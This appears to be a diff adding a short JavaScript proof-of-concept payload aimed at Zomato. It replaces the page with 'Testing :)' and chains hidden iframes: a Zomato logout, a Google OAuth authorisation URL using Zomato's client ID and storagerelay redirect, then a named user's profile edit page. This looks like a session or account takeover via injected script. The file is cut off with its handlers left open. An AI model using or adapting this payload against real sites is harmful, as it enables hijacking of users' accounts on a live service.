@@ -1,0 +1,18 @@
+document.body.innerHTML='<html><body><center><h1>Testing :)</h1></center></body></html>';
+
+var profileIframe = document.createElement('iframe');
+ profileIframe.setAttribute('src', 'https://zomato.com/logout');
+ profileIframe.setAttribute('id', 'pi');
+ document.body.appendChild(profileIframe);
+
+document.getElementById('pi').onload = function() {
+ var profileIframe1 = document.createElement('iframe');
+ profileIframe1.setAttribute('src', 'https://accounts.google.com/o/oauth2/auth?redirect_uri=storagerelay%3A%2F%2Fhttps%2Fwww.zomato.com%3Fid%3Dauth979775&response_type=code%20permission%20id_token&scope=email%20profile%20openid&openid.realm=&client_id=442739719837.apps.googleusercontent.com&ss_domain=https%3A%2F%2Fwww.zomato.com&access_type=offline&include_granted_scopes=true&prompt=select_account&origin=https%3A%2F%2Fwww.zomato.com&gsiwebsdk=2');
+ profileIframe1.setAttribute('id', 'lo1');
+ document.body.appendChild(profileIframe1);
+
+document.getElementById('lo1').onload = function() {
+ var profileIframe2 = document.createElement('iframe');
+ profileIframe2.setAttribute('src', 'https://www.zomato.com/users/preetham-94020377/edit');
+ profileIframe2.setAttribute('id', 'po');
+ document.body.appendChild(profileIframe2);
